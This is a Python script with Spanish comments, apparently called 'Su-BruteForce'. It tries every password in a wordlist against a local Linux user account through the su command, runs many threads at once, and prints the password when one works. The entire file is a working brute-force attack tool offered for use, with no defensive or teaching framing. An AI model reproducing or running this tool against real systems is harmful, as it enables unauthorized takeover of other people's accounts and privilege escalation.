import subprocess
import sys
import threading
import argparse
import os
import time

# Variable global para indicar si se ha encontrado la contraseña
global encontrada
encontrada = False

# Variable global para el número de líneas en la wordlist
global n_lineas
n_lineas = 0

# Bloqueo para sincronizar la salida de los threads
lock = threading.Lock()
inicio = time.time()

def show_banner():
    print(r"   _____                  ____             _       ______                  ")
    print(r"  / ____|                |  _ \           | |     |  ____|                 ")
    print(r" | (___  _   _   ______  | |_) |_ __ _   _| |_ ___| |__ ___  _ __ ___ ___  ")
    print(r"  \___ \| | | | |______| |  _ <| '__| | | | __/ _ \  __/ _ \| '__/ __/ _ \ ")
    print(r"  ____) | |_| |          | |_) | |  | |_| | ||  __/ | | (_) | | | (_|  __/ ")
    print(r" |_____/ \__,_|          |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___| ")
    print()
    print("============================ Created by Hgo08 =============================")

def show_info(user, wordlist, threads, timeout):
    print(f"[*] Username: {user}")
    print(f"[*] Wordlist: {wordlist}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Timeout: {timeout}")
    print(f"[i] Status: Starting brute-force attack...")
    print("===========================================================================")

# Cuenta las lineas de la wordlist
def lineas_wordlist(wordlist):
    global n_lineas
    n_lineas = 0
    with open(wordlist, "r", encoding="latin-1", errors="replace") as f:
        for _ in f:
            n_lineas += 1


def ataque_threads(wordlist, usuario, num_threads, timeout):
    # Hay definir el array antes de usarlo
    threads = []
    i = 0
    #Intenta abrir el archivo con lectura
    try:
        with open(wordlist, 'r',  encoding="latin-1", errors="replace") as file:
            # Por cada lina en el archivo crea un nuevo thread con cada linea/contraseña
            for password in file:
                i += 1
                # Quita el salto de linea
                password = password.strip()
                # Crea el thread
                thread = threading.Thread(target=probar_contraseña, args=(password, usuario, timeout, i))
                # Añade el thread al array
                threads.append(thread)

                # Si ya hay el numero maximo de threads los inicia y espera a que terminen
                if len(threads) >= num_threads:
                    for t in threads:
                        t.start()
                    for t in threads:
                        t.join()
                    # Limpia el array de threads
                    threads = []

            # Para los threads que queden por fuera del num_threads
            if threads:
                for t in threads:
                    t.start()
                for t in threads:
                    t.join() 
                
    # Si no enceuntra el archivo lo dice
    except FileNotFoundError:
        print(f'Error: El archivo "{wordlist}" no fue encontrado.')
    # Si da otro error tmbn lo dice
    except Exception as e:
        print(f'Error: {e} al intentar abrir el archivo "{wordlist}".')
        

def probar_contraseña(password, usuario, timeout, index):
    # Si ya se encontró la contraseña, salir del thread
    global encontrada
    try:
        # Bloqueo para evitar que varios threads escriban al mismo tiempo
        with lock:
            if encontrada:
                return
            # /r para volver al inicio de la línea y sobrescribir \033[2F para mover cursor arriba 2 lineas y \033[K para limpiar la línea
            # \033[2B para bajar 2 lineas y \033[0G para volver al inicio de la línea
            print(f"\r\033[2F\033[K[i] Probando contraseña {index}/{n_lineas}: {password} \033[2B\033[0G", end="", flush=True)

        # Ejecuta el comando su con la contraseña dada            
        result = subprocess.run(['su', usuario, '-c', 'whoami'], input=password, text=True, capture_output=True, timeout=timeout)

        # Si el comando fue exitoso, la contraseña es correcta
        if result.returncode == 0:
            encontrada = True
            print(f"Contraseña encontrada: {password} en {index} intentos. Tiempo total: {time.time() - inicio:.2f} segundos.")
            #print(f"\r\033[KContraseña encontrada: {password} en {index} intentos. Tiempo total: {time.time() - inicio:.2f} segundos.\033[0G", end="", flush=True)
            os._exit(1)  # Salir de todos los threads cuando se encuentra la contraseña
    # Si ocurre un error (como timeout), simplemente pasa
    except:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=show_banner())

    # Argumento -w, diccionario
    parser.add_argument('-w', '--wordlist', type=str, help="Ruta del diccionario de contraseñas", required=True)

    # Argumento -u, usuario
    parser.add_argument('-u', '--user', type=str, help="Usuario para probar contraseñas", required=True)

    # Argumento -T, threads a usar
    parser.add_argument('-T', '--threads', type=int, help="Threads a usar, por defecto 8", default=8, required=False)

    # Argumento -t, timeout
    parser.add_argument('-t', '--timeout', type=float, help="Timeout", default=0.1, required=False)

    args = parser.parse_args()
    show_info(args.user, args.wordlist, args.threads, args.timeout)
    lineas_wordlist(args.wordlist)
    ataque_threads(args.wordlist, args.user, args.threads, args.timeout)